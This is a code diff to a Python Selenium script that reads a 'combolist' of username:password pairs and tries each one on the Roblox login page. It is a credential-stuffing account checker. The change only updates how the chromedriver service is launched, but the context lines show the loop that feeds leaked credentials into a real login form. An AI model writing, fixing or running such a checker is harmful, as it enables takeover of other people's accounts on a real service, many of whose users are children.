@@ -1,4 +1,5 @@
 from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
 from colorama import Fore
@@ -37,6 +38,10 @@ print(f"""{magenta}
 comboName = str(input(f"{magenta}Combolist name: {reset}"))
 combolist = open(comboName + ".txt", "r").readlines()
 
+# Specify the path to your chromedriver executable
+chromedriver_path = 'C:/Users/Pc/Desktop/ggggg1/chromedriver.exe'
+service = Service(executable_path=chromedriver_path)
+
 for combo in combolist:
     seq = combo.strip()
     acc = seq.split(":")
@@ -44,7 +49,7 @@ for combo in combolist:
     username = acc[0]
     password = acc[1]
 
-    driver = webdriver.Chrome(r'chromedriver.exe')
+    driver = webdriver.Chrome(service=service, options=options)
     driver.get("https://www.roblox.com/Login")
     sleep(1)
     cookieBtn = driver.find_element(By.XPATH, "//*[contains(text(), 'Accept All')]")
